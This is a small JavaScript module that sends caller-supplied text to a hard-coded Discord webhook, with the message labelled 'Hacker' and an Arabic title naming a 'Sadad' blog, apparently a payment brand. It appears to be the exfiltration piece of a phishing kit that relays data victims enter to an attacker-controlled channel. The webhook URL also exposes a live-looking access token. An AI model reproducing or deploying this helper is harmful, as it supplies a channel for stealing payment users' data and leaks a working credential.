import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323744029443362870/WJoQI5tHFjnbrKBGZ_wgePvhaR2VjObXk7tm8r017OJnmx7rubbPN8fVT9s56S2Unkn3",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
